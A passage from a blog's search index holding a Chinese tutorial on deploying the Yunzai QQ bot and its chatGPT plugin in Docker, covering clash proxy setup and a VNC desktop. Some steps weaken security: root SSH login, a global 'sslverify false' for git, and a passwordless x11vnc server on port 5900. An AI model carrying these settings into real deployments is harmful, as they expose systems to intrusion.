<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>云崽机器人与chatGPT插件的安装</title>
      <link href="article/Yunzai-chatgptPlugin/"/>
      <url>article/Yunzai-chatgptPlugin/</url>
      
        <content type="html"><![CDATA[<p>本篇记录云崽机器人在Ubuntu20下的Docker环境中的过程及chatgpt-plugin的安装和排错</p><span id="more"></span><p>宿主机环境：Ubuntu20虚拟机</p><p>Yunzai环境：Docker</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文地址：<a href="https://err0r.top/article/Yunzai-chatgptPlugin/">https://err0r.top/article/Yunzai-chatgptPlugin/</a></p><p>转载请注明作者和原文地址，谢谢！</p><p>本人原批（开门见山），一直在用云崽，最近chatGPT大火，偶然发现有大佬写了云崽的chatGPT插件，家里买了台新NAS（群晖黑转白），总想搞点什么折腾一下，于是乎把在云服务器上的云崽迁移了下来，并且重新安装了一遍。加入了chatGPT插件的群发现不少人有奇奇怪怪的问题，自己也遇到其中不少，就顺手写下此篇文章，给其他有问题的同学一个参考。由于本人非酋抽不到bing的测试资格，相关配置等拿到资格了再说，生气。</p><p><strong>声明</strong>：本方案较为繁琐，可以直接跳到对应的章节看对应的项目怎么安装。本教程记录了全部安装过程，贴出很多指令为防本人后续忘记，如您已经配置完毕即可跳过对应小节:)</p><h2 id="环境及插件准备"><a href="#环境及插件准备" class="headerlink" title="环境及插件准备"></a>环境及插件准备</h2><p>系统：Ubuntu20虚拟机 下载地址：<a href="https://next.itellyou.cn/">MSDN</a></p><p>YunzaiBot：【2023.2.15 yunzai的github仓库被ban，目前转为gitee下载】<a href="https://gitee.com/Le-niao/Yunzai-Bot">Yunzai</a></p><p>chatGPT-Plugin：<a href="https://github.com/ikechan8370/chatgpt-plugin">chatGPT-Plugin</a></p><p><strong>以下选装，非本文主题</strong></p><p>Guoba-Plugin：<a href="https://github.com/guoba-yunzai/guoba-plugin">Guoba-Plugin</a></p><p>miao-plugin：<a href="https://github.com/yoimiya-kokomi/miao-plugin">miao-plugin</a></p><p>rconsole-plugin：<a href="https://gitee.com/kyrzy0416/rconsole-plugin">rconsole-plugin</a></p><p>xiaoyao-cvs-plugin：<a href="https://github.com/ctrlcvs/xiaoyao-cvs-plugin">xiaoyao-cvs-plugin</a></p><p>xitian-plugin：<a href="https://github.com/XiTianGame/xitian-plugin">xitian-plugin</a></p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>保姆级教程，大佬们可以跳过前段部分</p><h3 id="安装Ubuntu20及相关设置"><a href="#安装Ubuntu20及相关设置" class="headerlink" title="安装Ubuntu20及相关设置"></a>安装Ubuntu20及相关设置</h3><p>因为是在NAS上跑虚拟机，所以我选择了Live版，纯命令行版本，安装过程会让你配一些选项，这里选择装一下OpenSSH，后续可以远程连接</p><h4 id="配置root登陆"><a href="#配置root登陆" class="headerlink" title="配置root登陆"></a>配置root登陆</h4><p><strong>注意，本次安装是在家里的NAS上安装，如在公网或非安全环境下请勿配置root登陆并设置强密码！！！</strong></p><p><strong>为方便复制和非root用户，本文中大部分可能需要权限的指令都加上了<code>sudo</code>，请自行斟酌</strong></p><p>默认的ssh配置<code>/etc/ssh/sshd_config</code>是这样的</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># PermitRootLogin without-password</span></code></pre><p>是注释状态，我们不用管，直接在最后补一行<code>PermitRootLogin yes</code>即可</p><p>命令行运行：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"PermitRootLogin yes"</span> <span class="token operator">>></span> /etc/ssh/sshd_config<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> restart</code></pre><p>即可远程登录系统</p><h3 id="安装Docker及docker-compose"><a href="#安装Docker及docker-compose" class="headerlink" title="安装Docker及docker-compose"></a>安装Docker及docker-compose</h3><p>（很多人喜欢直接在本机装yunzai，不过我还是喜欢Docker版的，虽说有点麻烦，但整理方便）</p><p><a href="https://docs.docker.com/engine/install/ubuntu/">docker官网的文档</a></p><blockquote><p>新装的系统不存在旧版本安装的问题，如果已安装Docker且无法正常运行，请运行：<code>sudo apt-get remove docker docker-engine docker.io containerd runc</code></p></blockquote><p>不做过多阐述，按照命令行如下安装即可：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token punctuation">\</span>    ca-certificates <span class="token punctuation">\</span>    <span class="token function">curl</span> <span class="token punctuation">\</span>    gnupg <span class="token punctuation">\</span>    lsb-release <span class="token parameter variable">-y</span><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-m</span> 0755 <span class="token parameter variable">-p</span> /etc/apt/keyrings<span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://download.docker.com/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> gpg <span class="token parameter variable">--dearmor</span> <span class="token parameter variable">-o</span> /etc/apt/keyrings/docker.gpg<span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>  <span class="token string">"deb [arch=<span class="token variable"><span class="token variable">$(</span>dpkg --print-architecture<span class="token variable">)</span></span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \  <span class="token variable"><span class="token variable">$(</span>lsb_release <span class="token parameter variable">-cs</span><span class="token variable">)</span></span> stable"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list <span class="token operator">></span> /dev/null<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin <span class="token parameter variable">-y</span></code></pre><p>如果有问题请去官网查看文档，都有很详细的解释和排错</p><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p>这里是在宿主机使用clash设置代理和自动启动</p><h4 id="下载clash"><a href="#下载clash" class="headerlink" title="下载clash"></a>下载clash</h4><p><a href="https://github.com/Dreamacro/clash/releases">clash</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-O</span> clash.gz https://github.com/Dreamacro/clash/releases/download/v1.13.0/clash-linux-amd64-v1.13.0.gz</code></pre><p>下载好后解压安装包中 clash 到 &#x2F;usr&#x2F;local&#x2F;bin&#x2F; 目录下，给予执行权限，并以此在全局环境运行软件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">gzip</span> <span class="token parameter variable">-dc</span> clash.gz <span class="token operator">></span> /usr/local/bin/clash<span class="token function">chmod</span> +x /usr/local/bin/clash</code></pre><p>创建配置文件目录，并<a href="https://www.sub-speeder.com/client-download/Country.mmdb">下载 MMDB 文件</a>（如果速度慢可以直接下载后上传）</p><blockquote><p>MMDB 文件可以提供 IP 与地理位置相对应的数据信息，可以更精确地确认 IP 所对应地域，以此提高网络分流的效率和质量</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/clash<span class="token function">wget</span> <span class="token parameter variable">-O</span> /etc/clash/Country.mmdb https://www.sub-speeder.com/client-download/Country.mmdb</code></pre><h4 id="持久化运行"><a href="#持久化运行" class="headerlink" title="持久化运行"></a>持久化运行</h4><p>创建 systemd 脚本，以使程序持久化运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"[Unit]Description=clash daemon [Service]Type=simple# 注意此处userUser=rootExecStart=/usr/local/bin/clash -d /etc/clash/Restart=on-failure [Install]WantedBy=multi-user.target"</span> <span class="token operator">></span> /etc/systemd/system/clash.service</code></pre><p>重载 systemd</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload</code></pre><h4 id=""><a href="#" class="headerlink" title="********"></a>********</h4><p>下载你的配置文件后写入<code>/etc/clash/config.yaml</code></p><p>或者直接wget下载</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> <span class="token parameter variable">-O</span> /etc/clash/config.yaml https://example.com/config.yaml</code></pre><h4 id="设置系统代理"><a href="#设置系统代理" class="headerlink" title="设置系统代理"></a>设置系统代理</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">'export http_proxy="http://127.0.0.1:7890"export https_proxy="https://127.0.0.1:7890"export no_proxy="localhost, 127.0.0.1"'</span> <span class="token operator">></span> /etc/profile.d/proxy.sh</code></pre><h4 id="重载-x2F-etc-x2F-profile-配置"><a href="#重载-x2F-etc-x2F-profile-配置" class="headerlink" title="重载 &#x2F;etc&#x2F;profile 配置"></a>重载 &#x2F;etc&#x2F;profile 配置</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /etc/profile</code></pre><h4 id="启动clash并设置开机自启"><a href="#启动clash并设置开机自启" class="headerlink" title="启动clash并设置开机自启"></a>启动clash并设置开机自启</h4><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl start clashsystemctl <span class="token builtin class-name">enable</span> clash</code></pre><p>此时可以通过<code>curl www.google.com</code>测试代理是否正常</p><h4 id="配置git代理-amp-跳过ssl证书校验"><a href="#配置git代理-amp-跳过ssl证书校验" class="headerlink" title="配置git代理&amp;跳过ssl证书校验"></a>配置git代理&amp;跳过ssl证书校验</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy <span class="token number">127.0</span>.0.1:7890<span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy <span class="token number">127.0</span>.0.1:7890<span class="token function">git</span> config <span class="token parameter variable">--global</span> https.sslverify <span class="token boolean">false</span></code></pre><h3 id="下载Yunzai及对应的插件"><a href="#下载Yunzai及对应的插件" class="headerlink" title="下载Yunzai及对应的插件"></a>下载Yunzai及对应的插件</h3><h4 id="下载Yunzai"><a href="#下载Yunzai" class="headerlink" title="下载Yunzai"></a>下载Yunzai</h4><p>在你想要的目录运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-b</span> main https://gitee.com/Le-niao/Yunzai-Bot.git</code></pre><p>进入Yunzai目录</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Yunzai-Bot/</code></pre><p><strong>注意：至此以后所有的目录默认均在Yunzai目录下！！！</strong></p><h4 id="下载对应插件"><a href="#下载对应插件" class="headerlink" title="下载对应插件"></a>下载对应插件</h4><p><strong>注意</strong>：如果卡的话请将<code>github</code>更换为<code>gitee</code>，如不需要可跳过本小节，安装插件前请看好对应作用及说明，本教程会展示安装全部插件及所需库的过程</p><h5 id="chatGPT-Plugin"><a href="#chatGPT-Plugin" class="headerlink" title="chatGPT-Plugin"></a>chatGPT-Plugin</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/ikechan8370/chatgpt-plugin.git ./plugins/chatgpt-plugin</code></pre><h5 id="Guoba-Plugin"><a href="#Guoba-Plugin" class="headerlink" title="Guoba-Plugin"></a>Guoba-Plugin</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/guoba-yunzai/guoba-plugin.git ./plugins/Guoba-Plugin/</code></pre><h5 id="miao-plugin"><a href="#miao-plugin" class="headerlink" title="miao-plugin"></a>miao-plugin</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/yoimiya-kokomi/miao-plugin.git ./plugins/miao-plugin/</code></pre><h5 id="rconsole-plugin"><a href="#rconsole-plugin" class="headerlink" title="rconsole-plugin"></a>rconsole-plugin</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://gitee.com/kyrzy0416/rconsole-plugin ./plugins/rconsole-plugin/</code></pre><h5 id="xiaoyao-cvs-plugin"><a href="#xiaoyao-cvs-plugin" class="headerlink" title="xiaoyao-cvs-plugin"></a>xiaoyao-cvs-plugin</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/Ctrlcvs/xiaoyao-cvs-plugin.git ./plugins/xiaoyao-cvs-plugin/</code></pre><h5 id="xitian-plugin"><a href="#xitian-plugin" class="headerlink" title="xitian-plugin"></a>xitian-plugin</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span> https://github.com/XiTianGame/xitian-plugin.git ./plugins/xitian-plugin/</code></pre><h3 id="更新docker-compose-yaml文件"><a href="#更新docker-compose-yaml文件" class="headerlink" title="更新docker-compose.yaml文件"></a>更新docker-compose.yaml文件</h3><p>如果您不使用docker搭建Yunzai，请跳过此步骤</p><p>正常情况下默认的docker-compose文件肯定是不行的，我们要把插件加进去，下面给出一份参考文件，可以直接复制但请一定对比看好注释，默认的注释已全部删除，仅放出修改部分的注释</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">yunzai-bot</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> yunzai<span class="token punctuation">-</span>bot    <span class="token comment"># image: swr.cn-south-1.myhuaweicloud.com/sirly/yunzai-bot:v3         # 使用云端精简镜像</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> swr.cn<span class="token punctuation">-</span>south<span class="token punctuation">-</span>1.myhuaweicloud.com/sirly/yunzai<span class="token punctuation">-</span>bot<span class="token punctuation">:</span>v3plus   <span class="token comment"># 使用扩展镜像，如果你想节省资源可以注释此行用上面的精简镜像</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"50831:50831"</span>      <span class="token comment"># 映射锅巴插件端口</span>      <span class="token punctuation">-</span> <span class="token string">"5900:5900"</span>        <span class="token comment"># 此端口为chatGPT浏览器模式所需的桌面程序所释放的端口</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./yunzai/config/<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/config/config/      <span class="token punctuation">-</span> ./yunzai/genshin_config<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/genshin/config      <span class="token punctuation">-</span> ./yunzai/logs<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/logs      <span class="token punctuation">-</span> ./yunzai/data<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/data            <span class="token comment"># 以下目录是插件目录，安装完插件后需要手动添加映射（如有其他插件请自行添加）</span>      <span class="token comment"># 映射格式：./yunzai/plugins/&lt;插件目录名>:/app/Yunzai-Bot/plugins/&lt;插件目录名></span>      <span class="token punctuation">-</span> ./yunzai/plugins/example<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/example                          <span class="token comment"># 单js插件目录</span>      <span class="token punctuation">-</span> ./yunzai/plugins/miao<span class="token punctuation">-</span>plugin<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/miao<span class="token punctuation">-</span>plugin                  <span class="token comment"># 喵喵插件</span>      <span class="token comment"># - ./yunzai/plugins/py-plugin:/app/Yunzai-Bot/plugins/py-plugin                      # 新py插件</span>      <span class="token punctuation">-</span> ./yunzai/plugins/xiaoyao<span class="token punctuation">-</span>cvs<span class="token punctuation">-</span>plugin<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/xiaoyao<span class="token punctuation">-</span>cvs<span class="token punctuation">-</span>plugin    <span class="token comment"># 图鉴插件</span>      <span class="token punctuation">-</span> ./yunzai/plugins/chatgpt<span class="token punctuation">-</span>plugin<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/chatgpt<span class="token punctuation">-</span>plugin    <span class="token comment"># chatgpt插件</span>      <span class="token punctuation">-</span> ./yunzai/plugins/xitian<span class="token punctuation">-</span>plugin<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/xitian<span class="token punctuation">-</span>plugin    <span class="token comment"># xitian插件</span>      <span class="token punctuation">-</span> ./yunzai/plugins/rconsole<span class="token punctuation">-</span>plugin<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/rconsole<span class="token punctuation">-</span>plugin    <span class="token comment"># R插件</span>      <span class="token punctuation">-</span> ./yunzai/plugins/Guoba<span class="token punctuation">-</span>Plugin<span class="token punctuation">:</span>/app/Yunzai<span class="token punctuation">-</span>Bot/plugins/Guoba<span class="token punctuation">-</span>Plugin                <span class="token comment"># 锅巴插件</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> CUID=1000      <span class="token punctuation">-</span> CGID=1000    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token key atrule">redis</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span> <span class="token key atrule">condition</span><span class="token punctuation">:</span> service_healthy <span class="token punctuation">&#125;</span>    <span class="token key atrule">deploy</span><span class="token punctuation">:</span>      <span class="token key atrule">resources</span><span class="token punctuation">:</span>        <span class="token key atrule">limits</span><span class="token punctuation">:</span>          <span class="token key atrule">memory</span><span class="token punctuation">:</span> 2G  <span class="token key atrule">redis</span><span class="token punctuation">:</span>    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> yunzai<span class="token punctuation">-</span>redis    <span class="token key atrule">image</span><span class="token punctuation">:</span> redis<span class="token punctuation">:</span>alpine    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./redis/data<span class="token punctuation">:</span>/data      <span class="token punctuation">-</span> ./redis/logs<span class="token punctuation">:</span>/logs    <span class="token key atrule">healthcheck</span><span class="token punctuation">:</span>      <span class="token key atrule">test</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token string">"CMD"</span><span class="token punctuation">,</span> <span class="token string">"redis-cli"</span><span class="token punctuation">,</span> <span class="token string">"PING"</span> <span class="token punctuation">]</span>      <span class="token key atrule">start_period</span><span class="token punctuation">:</span> 10s      <span class="token key atrule">interval</span><span class="token punctuation">:</span> 5s      <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 1s</code></pre><h3 id="【docker】开始安装"><a href="#【docker】开始安装" class="headerlink" title="【docker】开始安装"></a>【docker】开始安装</h3><p><strong>如果您不使用docker版请按照Yunzai的README所提供的方式启动</strong></p><p>Yunzai目录下运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose up <span class="token parameter variable">-d</span></code></pre><blockquote><p>如果您是安装的docker compose standalone，非plugin，则命令为<code>docker-compose up -d</code></p></blockquote><img src="/article/Yunzai-chatgptPlugin/image-20230215220213208.png" class="" title="image-20230215220213208" loading="lazy"><p>安装完毕后运行<code>docker ps</code>会看到如上</p><h3 id="进行相关配置"><a href="#进行相关配置" class="headerlink" title="进行相关配置"></a>进行相关配置</h3><h4 id="Yunzai的配置"><a href="#Yunzai的配置" class="headerlink" title="Yunzai的配置"></a>Yunzai的配置</h4><p>进入docker容器</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> yunzai-bot <span class="token function">bash</span></code></pre><img src="/article/Yunzai-chatgptPlugin/image-20230215220526567.png" class="" title="image-20230215220526567" loading="lazy"><p>结合前图所示，可以看到命令行前符号变成了<code>root@2c02297a53c1</code>，而这个<code>2c02297a53c1</code>就是前图所示我的yunzai-bot的<code>CONTAINER ID</code>，说明我们<strong>已经进入了yunzai-bot容器内部</strong></p><p>在容器内部运行<code>exit</code>即可退出容器，标志为命令行符号变成主机名了</p><blockquote><p>接下的步骤基本同在主机安装的步骤一样</p></blockquote><p>在<strong>容器内部</strong>的Yunzai目录（默认就在，不用动）运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run login</code></pre><p>按照提示输入账号密码，登录端口默认ipad就行</p><p>可以不设置密码，进行扫码登录，但扫码登录要求设备和系统<strong>在同一个网络环境下</strong></p><img src="/article/Yunzai-chatgptPlugin/image-20230215221128864.png" class="" title="image-20230215221128864" loading="lazy"><h4 id="获取ticket"><a href="#获取ticket" class="headerlink" title="获取ticket"></a>获取ticket</h4><p>触发了验证选择<code>手动获取ticket</code>的步骤，选择<code>滑动验证app</code>请跳过并按照要求操作</p><ol><li>先打开给出的链接，在浏览器中首先<strong>按下F12或直接打开开发者模式</strong></li><li>打开”网络”或”Network”</li><li>完成滑动验证</li><li>在网络请求中找到<code>cap_union_new_verify</code>，点击Preview，右键<code>ticket</code>选择<code>Copy value</code></li><li>回到系统粘贴</li></ol><img src="/article/Yunzai-chatgptPlugin/image-20230215220956779.png" class="" title="image-20230215220956779" loading="lazy"><p>如果触发了二次验证，请按要求验证</p><blockquote><p>2023.2.15 本人试了几台机子<code>网页扫码验证</code>都显示不出来</p><img src="/article/Yunzai-chatgptPlugin/image-20230215223558251.png" class="" title="image-20230215223558251" loading="lazy"></blockquote><p>成功登陆后本地就保存了登录的token，按CTRL+C退出到容器命令行界面</p><img src="/article/Yunzai-chatgptPlugin/image-20230215223738225.png" class="" title="image-20230215223738225" loading="lazy"><h4 id="chatGPT对应的配置"><a href="#chatGPT对应的配置" class="headerlink" title="chatGPT对应的配置"></a>chatGPT对应的配置</h4><p>配置文件位置</p><pre class="language-bash" data-language="bash"><code class="language-bash">plugins/chatgpt-plugin/config/index.js</code></pre><blockquote><p>注意：如果您是docker用户，在安装完（即执行完<code>docker-compose up -d</code>后，可以发现Yunzai-bot的目录下多了一个yunzai文件夹，这是Yunzai在编译的时候映射入docker容器内的文件夹，文件夹目录如下</p><pre class="language-none"><code class="language-none">yunzai├── config│   ├── bot.yaml│   ├── group.yaml│   ├── other.yaml│   ├── qq.yaml│   └── redis.yaml├── data│   ├── [你登录的qq号]│   │   └── device-[你登录的qq号].json│   ├── html│   └── image├── genshin_config├── logs└── plugins</code></pre><p>所有的文件修改请在此文件夹下修改，如我需要改<code>qq.yaml</code>，请勿在<code>Yunzai-Bot/config/qq.yaml</code>更改，而是在<code>Yunzai-Bot/yunzai/config/qq.yaml</code>修改！！！</p><p>此处有两种方案</p><ol><li><strong>退出容器</strong>，在宿主机的<code>Yunzai-Bot/yunzai/plugins/chatgpt-plugin/config/index.js</code></li><li>在容器内，修改<code>Yunzai-Bot/plugins/chatgpt-plugin/config/index.js</code></li></ol></blockquote><p>请自行查看文档并上传或vim等方式修改</p><h5 id="【docker】配置代理（重点）"><a href="#【docker】配置代理（重点）" class="headerlink" title="【docker】配置代理（重点）"></a>【docker】配置代理（重点）</h5><p><strong>如使用docker版，请一定一定注意代理的配置！！！在配置文件的第二行</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">PROXY</span> <span class="token operator">=</span> <span class="token string">''</span></code></pre><p>注意！由于是docker版，docker内部的网络与宿主机不同，我们需要宿主机的代理，请注意宿主机的代理需设置为允许lan连接</p><blockquote><p>Docker 服务默认会创建一个 <em>docker0</em> 网桥(其上有一个 docker0 内部接口)，它在内核层连通了其他的物理或虚拟网卡</p></blockquote><p>在宿主机，即主机运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> network <span class="token function">ls</span></code></pre><img src="/article/Yunzai-chatgptPlugin/image-20230215224253515.png" class="" title="image-20230215224253515" loading="lazy"><p>可以看到有一个yunzai的网络，运行命令查看</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> network inspect yunzai-bot_default</code></pre><img src="/article/Yunzai-chatgptPlugin/image-20230215224533490.png" class="" title="image-20230215224533490" loading="lazy"><p>可以看到这就是我的yunzai-bot所在的虚拟网，我们只要关注<code>IPAM-Config-Gateway</code>即可，这个地址就是我们宿主机和这个网络通信的地址，也是我们宿主机在这个网络的地址，所以我们的代理地址就需要填这个而不是127.0.0.1</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 每个人每台机子随机分配地址，不一定一样，请按照自己的情况配置，这里我就该配置</span><span class="token keyword">const</span> <span class="token constant">PROXY</span> <span class="token operator">=</span> <span class="token string">'http://172.21.0.1:7890'</span> <span class="token comment">// 7890是我宿主机的clash默认的http代理端口</span></code></pre><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><p>如果是docker用户请注意，所有依赖均需要在<strong>容器内</strong>安装，如未安装插件则无需安装其依赖</p><p>miao-plugin&#x2F;py-plugin&#x2F;xiaoyao-cvs-plugin&#x2F;Guoba-Plugin插件依赖默认在docker构建镜像时就已经安装，无需额外操作</p><p>chatGPT-Plugin所需依赖</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">pnpm</span> <span class="token function">install</span> <span class="token parameter variable">-w</span> undici chatgpt showdown mathjax-node delay uuid remark strip-markdown random puppeteer-extra-plugin-recaptcha puppeteer-extra puppeteer-extra-plugin-stealth @waylaidwanderer/chatgpt-api keyv-file</code></pre><p>rconsole-plugin所需依赖</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">pnpm</span> <span class="token function">add</span> mongodb axios tunnel twitter-api-v2 <span class="token parameter variable">-w</span></code></pre><h3 id="【docker】最后"><a href="#【docker】最后" class="headerlink" title="【docker】最后"></a>【docker】最后</h3><p>重启Yunzai-Bot容器</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> restart yunzai-bot</code></pre><p>基础安装教程到这里就结束了</p><h2 id="【docker】chatGPT-Plugin想使用浏览器模式怎么办"><a href="#【docker】chatGPT-Plugin想使用浏览器模式怎么办" class="headerlink" title="【docker】chatGPT-Plugin想使用浏览器模式怎么办"></a>【docker】chatGPT-Plugin想使用浏览器模式怎么办</h2><p>chatGPT-Plugin想使用浏览器模式需要有桌面环境</p><ol><li><strong>容器内</strong>执行，安装xvfb和fluxbox，并选择安装screen或tmux，这里以screen演示</li></ol><p>Ubuntu：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> x11vnc xvfb fluxbox <span class="token function">screen</span></code></pre><p>CentOS：</p><pre class="language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> x11vnc Xvfb fluxbox <span class="token function">screen</span></code></pre><ol start="2"><li>启动桌面环境</li></ol><p>首先运行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span></code></pre><p>接着在弹出来的新命令行输入</p><pre class="language-bash" data-language="bash"><code class="language-bash">x11vnc <span class="token parameter variable">-create</span> <span class="token parameter variable">-env</span> <span class="token assign-left variable">FD_PROG</span><span class="token operator">=</span>/usr/bin/fluxbox <span class="token parameter variable">-env</span> <span class="token assign-left variable">X11VNC_FINDDISPLAY_ALWAYS_FAILS</span><span class="token operator">=</span><span class="token number">1</span>   <span class="token parameter variable">-env</span> <span class="token assign-left variable">X11VNC_CREATE_GEOM</span><span class="token operator">=</span><span class="token variable">$&#123;1<span class="token operator">:-</span>1024x768x16&#125;</span>   <span class="token parameter variable">-nopw</span> <span class="token parameter variable">-forever</span></code></pre><p>然后直接关闭这个窗口吧～</p><blockquote><p>你问我为啥，因为这个一启动就一直占前台，没机会CTRL+D退到后台，如果你的机器可以那就退到后台就行</p><p>用nohup挂后台反而多此一举</p></blockquote><ol start="3"><li>使用vnc客户端连接至桌面</li></ol><p>vnc连接你宿主机的 <code>[ip]:5900</code>，之前的端口映射就是为了把容器内部的端口映射到宿主机</p><blockquote><p>注意！再次强调安全问题！！！注意本命令使用默认5900端口和无密码，请勿在公网或非安全环境下使用</p></blockquote><img src="/article/Yunzai-chatgptPlugin/image-20230215231252730.png" class="" title="image-20230215231252730" loading="lazy"><p>使用vnc客户端连接至云桌面，右键Applications &gt; Shells &gt; Bash打开终端，然后进入Yunzai目录（默认就是）下运行node app即可</p><h2 id="如何更新插件"><a href="#如何更新插件" class="headerlink" title="如何更新插件"></a>如何更新插件</h2><p>一般情况下分为两种</p><h3 id="通过云崽机器人对话更新"><a href="#通过云崽机器人对话更新" class="headerlink" title="通过云崽机器人对话更新"></a>通过云崽机器人对话更新</h3><p>发送<code>#更新</code>即可更新机器人，如果插件支持自动更新，可以查看插件文档，如<code>#更新chatgpt</code>（TODO）</p><p><strong>注意：</strong>通过对话更新请在可以操作搭建环境的情况下进行，否则出现问题可能会导致崩溃无法解决</p><h3 id="直接操作源码更新"><a href="#直接操作源码更新" class="headerlink" title="直接操作源码更新"></a>直接操作源码更新</h3><p>进入仓库目录，打开命令行运行如下（默认已安装所需环境如git等）</p><pre class="language-bash" data-language="bash"><code 